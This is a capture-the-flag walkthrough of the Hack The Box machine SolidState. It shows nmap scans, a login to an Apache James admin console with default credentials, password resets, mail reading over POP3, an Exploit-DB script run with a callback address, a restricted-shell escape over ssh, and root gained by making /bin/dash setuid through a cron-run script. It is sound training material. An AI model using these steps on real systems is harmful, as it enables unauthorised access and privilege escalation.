# Solidstate Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA solidstate -T4 10.10.10.51``

![image](https://user-images.githubusercontent.com/123066149/230373146-769483c1-1080-4aa6-b1f0-bfee7acb3f3c.png)

``nmap -p- -sV -T4 -oA fullsolidstate 10.10.10.51``

![image](https://user-images.githubusercontent.com/123066149/230373494-4ff167f4-d678-428b-acd2-7dfb3406278b.png)

### We have a web site on the box but only html file on this :

![image](https://user-images.githubusercontent.com/123066149/230373805-dc88933b-0102-4584-84d3-e49fbf4c8ba6.png)

### After a litle research on google i have that :

![image](https://user-images.githubusercontent.com/123066149/230373962-cdde3e6f-c6a3-4296-8eb2-0ed4262635c6.png)

![image](https://user-images.githubusercontent.com/123066149/230374111-3581e0d8-b51f-4947-8a48-bae2d637fbf1.png)

### A litle telnet on the port 4555 :

``telnet 10.10.10.51 4555``

### Default cred's root and root :

![image](https://user-images.githubusercontent.com/123066149/230374604-73a6dc48-7298-48b6-a306-72070fef6ac9.png)

### I list all users and change all passwords :

![image](https://user-images.githubusercontent.com/123066149/230375398-c26e072a-1d55-45b7-8e3f-089011282ac8.png)

# ${{\color{purple}Initial Foothold}}\ $

### I tested this exploit but as we see we need a valid ssh creds :

https://www.exploit-db.com/exploits/50347

``python james_server_exploit.py 10.10.10.51 10.10.14.8 4444``

![image](https://user-images.githubusercontent.com/123066149/230375918-3f1101f0-9bc6-462e-8017-38f2ae86a442.png)

### We have some users and passwords we can check the email :

``telnet 10.10.10.51 110``

``USER mindy``

``PASS pass``

``LIST``

``RETR 1``

``RETR 2``

![image](https://user-images.githubusercontent.com/123066149/230377842-b49f52ff-eeee-4169-a62a-1f65c016b112.png)

![image](https://user-images.githubusercontent.com/123066149/230377539-76b8e733-410f-435b-a9d6-22d375a36829.png)

# ${{\color{purple}Exploitation}}\ $

### We are in restricted shell :

![image](https://user-images.githubusercontent.com/123066149/230378344-b1706a89-c52c-47cc-b146-e3b15980fa99.png)

### We can bypass that with thie commande :

``ssh mindy@10.10.10.51 -t "bash --noprofile"``

![image](https://user-images.githubusercontent.com/123066149/230378527-a3a1b4a6-6f69-46ca-8f46-c869eee20f31.png)

# ${{\color{purple}Privilege Escalation}}\ $

### After my enumeration i found this script :

![image](https://user-images.githubusercontent.com/123066149/230378975-d4df5a28-03e3-4040-95c5-0ff5b3d5b2d4.png)

### Pspy confirm me that this script run with a crontab :

![image](https://user-images.githubusercontent.com/123066149/230383159-98abc3b3-cb09-4f3a-8dcd-65f64fb1c8f2.png)

![image](https://user-images.githubusercontent.com/123066149/230382964-32169402-f2b1-4cf8-8b25-64b0e55678cf.png)

### We can edit the script and execute command :
### But regular rev shell are not working we have /bin/dash on the machine we will ad chmod 4755 to this binary :

``os.system('chmod 4755 /bin/dash')``

![image](https://user-images.githubusercontent.com/123066149/230384009-2578821d-9f32-483f-95fd-debe8e5cb87e.png)

``date``

``ls -lah /bin/dash``

![image](https://user-images.githubusercontent.com/123066149/230384123-a6526df4-21bd-48cc-b2df-bb13f070ff59.png)

![image](https://user-images.githubusercontent.com/123066149/230384619-80051ff2-7aab-4595-9208-5a80f9326f52.png)

``/bin/dash``

### And we are root :
 
![image](https://user-images.githubusercontent.com/123066149/230385136-1a3f0f26-5b4a-4cb4-ba99-e07374157c21.png)


# ${{\color{purple}Points of Improvement}}\ $
